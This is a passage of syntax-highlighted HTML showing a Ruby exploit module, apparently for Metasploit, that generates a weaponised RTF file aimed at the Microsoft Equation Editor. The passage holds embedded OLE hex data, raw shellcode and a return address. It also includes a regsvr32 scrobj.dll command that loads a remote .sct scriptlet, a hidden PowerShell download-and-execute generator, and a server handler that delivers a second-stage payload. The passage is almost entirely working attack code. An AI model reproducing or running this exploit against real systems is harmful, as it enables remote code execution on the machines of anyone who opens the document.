</span></span><span style=display:flex><span>        <span style=color:#66d9ef>OptString</span><span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#34;FILENAME&#34;</span>, <span style=color:#f92672>[</span><span style=color:#66d9ef>true</span>, <span style=color:#e6db74>&#34;Filename to save as&#34;</span><span style=color:#f92672>]</span>)
</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate_rtf</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;{\*\generator Riched20 6.3.9600}\viewkind4\uc1&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;\pard\sa200\sl276\slmult1\f0\fs22\lang9{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata &#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e007400720079000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;00000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020ce&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;a5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;000000000000001400000000000000010043006f006d0070004f0062006a0000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0001000000660000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;00000000000000000000000012000201ffffffff04000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000003&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;ffffff0100000208000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;00000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c00000044532045&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;71756174696f6e000b0000004571756174696f6e2e3300f439b2710000000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    header <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;00000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;4500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000400&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0000C50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;00000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C0000000000050000000902000000000500000002&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE00000000000090&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;01000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A60019016&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A00000031313131313131&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;3131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB02100007000000&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;0000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F00100&#39;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;00030000000000&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;}{\result{\pict{\*\picprop}\wmetafile8\picw380\pich260\picwgoal380\pichgoal260&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;0100090000039e00000002001c0000000000050000000902000000000500000002010100000005</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;00000000</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;}}}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    footer <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;\par}&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee</span><span style=color:#e6db74>[</span><span style=color:#ae81ff>\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08</span><span style=color:#e6db74>ZZ&#34;</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    shellcode <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x90</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> shellcode
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>0x00402114</span><span style=color:#f92672>].</span>pack(<span style=color:#e6db74>&#34;V&#34;</span>)
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;regsvr32 /s /n /u /i:</span><span style=color:#e6db74>#{</span>get_uri<span style=color:#e6db74>}</span><span style=color:#e6db74>.sct scrobj.dll&#34;</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> (payload <span style=color:#f92672>+</span> (<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>197</span> <span style=color:#f92672>-</span> payload<span style=color:#f92672>.</span>length)))<span style=color:#f92672>.</span>unpack(<span style=color:#e6db74>&#39;H*&#39;</span>)<span style=color:#f92672>.</span>first
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> header <span style=color:#f92672>+</span> payload <span style=color:#f92672>+</span> footer
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    rtf <span style=color:#f92672>=</span> <span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>new(datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;FILENAME&#39;</span><span style=color:#f92672>]</span>, <span style=color:#e6db74>&#39;w&#39;</span>)
</span></span><span style=display:flex><span>    rtf<span style=color:#f92672>.</span>write(payload)
</span></span><span style=display:flex><span>    rtf<span style=color:#f92672>.</span>close
</span></span><span style=display:flex><span>    rtf
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>gen_psh</span>(url, <span style=color:#f92672>*</span>method)
</span></span><span style=display:flex><span>    ignore_cert <span style=color:#f92672>=</span> <span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Powershell</span><span style=color:#f92672>::</span><span style=color:#66d9ef>PshMethods</span><span style=color:#f92672>.</span>ignore_ssl_certificate <span style=color:#66d9ef>if</span> ssl
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> method<span style=color:#f92672>.</span>include? <span style=color:#e6db74>&#39;string&#39;</span>
</span></span><span style=display:flex><span>      download_string <span style=color:#f92672>=</span> datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;PSH-Proxy&#39;</span><span style=color:#f92672>]</span> ? (<span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Powershell</span><span style=color:#f92672>::</span><span style=color:#66d9ef>PshMethods</span><span style=color:#f92672>.</span>proxy_aware_download_and_exec_string(url)) : (<span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Powershell</span><span style=color:#f92672>::</span><span style=color:#66d9ef>PshMethods</span><span style=color:#f92672>.</span>download_and_exec_string(url))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>      <span style=color:#75715e># Random filename to use, if there isn&#39;t anything set</span>
</span></span><span style=display:flex><span>      random <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>#{</span>rand_text_alphanumeric <span style=color:#ae81ff>8</span><span style=color:#e6db74>}</span><span style=color:#e6db74>.exe&#34;</span>
</span></span><span style=display:flex><span>      <span style=color:#75715e># Set filename (Use random filename if empty)</span>
</span></span><span style=display:flex><span>      filename <span style=color:#f92672>=</span> datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;BinaryEXE-FILENAME&#39;</span><span style=color:#f92672>].</span>blank? ? random : datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;BinaryEXE-FILENAME&#39;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#75715e># Set path (Use %TEMP% if empty)</span>
</span></span><span style=display:flex><span>      path <span style=color:#f92672>=</span> datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;BinaryEXE-PATH&#39;</span><span style=color:#f92672>].</span>blank? ? <span style=color:#e6db74>&#34;$env:temp&#34;</span> : <span style=color:#e6db74>%Q(&#39;</span><span style=color:#e6db74>#{</span>datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;BinaryEXE-PATH&#39;</span><span style=color:#f92672>]</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#75715e># Join Path and Filename</span>
</span></span><span style=display:flex><span>      file <span style=color:#f92672>=</span> <span style=color:#e6db74>%Q(echo (</span><span style=color:#e6db74>#{</span>path<span style=color:#e6db74>}</span><span style=color:#e6db74>+&#39;\\</span><span style=color:#e6db74>#{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#75715e># Generate download PowerShell command</span>
</span></span><span style=display:flex><span>      download_string <span style=color:#f92672>=</span> <span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Powershell</span><span style=color:#f92672>::</span><span style=color:#66d9ef>PshMethods</span><span style=color:#f92672>.</span>download_run(url, file)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    download_and_run <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>#{</span>ignore_cert<span style=color:#e6db74>}#{</span>download_string<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Generate main PowerShell command</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> generate_psh_command_line(<span style=color:#e6db74>noprofile</span>: <span style=color:#66d9ef>true</span>, <span style=color:#e6db74>windowstyle</span>: <span style=color:#e6db74>&#39;hidden&#39;</span>, <span style=color:#e6db74>command</span>: download_and_run)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>on_request_uri</span>(cli, _request)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> _request<span style=color:#f92672>.</span>raw_uri <span style=color:#f92672>=~</span> <span style=color:#e6db74>/\.sct$/</span>
</span></span><span style=display:flex><span>      print_status(<span style=color:#e6db74>&#34;Handling initial request from </span><span style=color:#e6db74>#{</span>cli<span style=color:#f92672>.</span>peerhost<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>      payload <span style=color:#f92672>=</span> gen_psh(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>#{</span>get_uri<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;string&#34;</span>)
</span></span><span style=display:flex><span>      data <span style=color:#f92672>=</span> gen_sct_file(payload)
</span></span><span style=display:flex><span>      send_response(cli, data, <span style=color:#e6db74>&#39;Content-Type&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;text/plain&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>      print_status(<span style=color:#e6db74>&#34;Stage two requested, sending...&#34;</span>)
</span></span><span style=display:flex><span>      p <span style=color:#f92672>=</span> regenerate_payload(cli)
</span></span><span style=display:flex><span>      data <span style=color:#f92672>=</span> cmd_psh_payload(p<span style=color:#f92672>.</span>encoded,
</span></span><span style=display:flex><span>                       payload_instance<span style=color:#f92672>.</span>arch<span style=color:#f92672>.</span>first,
</span></span><span style=display:flex><span>                       <span style=color:#e6db74>remove_comspec</span>: <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>                       <span style=color:#e6db74>exec_in_place</span>: <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>      )
</span></span><span style=display:flex><span>      send_response(cli, data, <span style=color:#e6db74>&#39;Content-Type&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;application/octet-stream&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rand_class_id</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>#{</span><span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>rand_text_hex <span style=color:#ae81ff>8</span><span style=color:#e6db74>}</span><span style=color:#e6db74>-</span><span style=color:#e6db74>#{</span><span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>rand_text_hex <span style=color:#ae81ff>4</span><span style=color:#e6db74>}</span><span style=color:#e6db74>-</span><span style=color:#e6db74>#{</span><span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>rand_text_hex <span style=color:#ae81ff>4</span><span style=color:#e6db74>}</span><span style=color:#e6db74>-</span><span style=color:#e6db74>#{</span><span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>rand_text_hex <span style=color:#ae81ff>4</span><span style=color:#e6db74>}</span><span style=color:#e6db74>-</span><span style=color:#e6db74>#{</span><span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>rand_text_hex <span style=color:#ae81ff>12</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>gen_sct_file</span>(command)
</span></span><span style=display:flex><span>    <span style=color:#75715e># If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).</span>
